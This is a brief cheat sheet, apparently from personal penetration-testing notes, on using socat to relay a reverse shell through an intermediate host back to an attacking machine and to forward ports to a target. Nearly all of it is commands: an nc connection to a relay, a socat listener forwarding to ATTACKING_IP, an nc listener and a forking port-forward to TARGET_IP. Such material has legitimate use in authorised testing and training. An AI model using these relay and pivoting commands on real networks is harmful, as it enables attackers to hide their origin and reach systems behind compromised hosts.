t,# Socat 
A guide on relay shells

**Basic Relay**

This creates a reverse shell, that is relayed through *socat* back to the attacking machine. 

```
nc RELAY_IP RELAY_PORT
```

```
socat tcp-l:RELAY_PORT tcp:ATTACKING_IP:ATTACKING_PORT &
```

```
nc -lnvp ATTACKING_PORT
```

**Port Fowarding - Easy**

```
./socat tcp-l:RELAY_PORT,fork,reuseaddr tcp:TARGET_IP:TARGET_PORT &  
```

Then connect to `RELAY_IP:RELAY_PORT` to have all traffic redirected to `TARGET_IP`

`fork` - Every connection starts a new process.
`reuseaddr` - Port stays open after a connection is made to it.
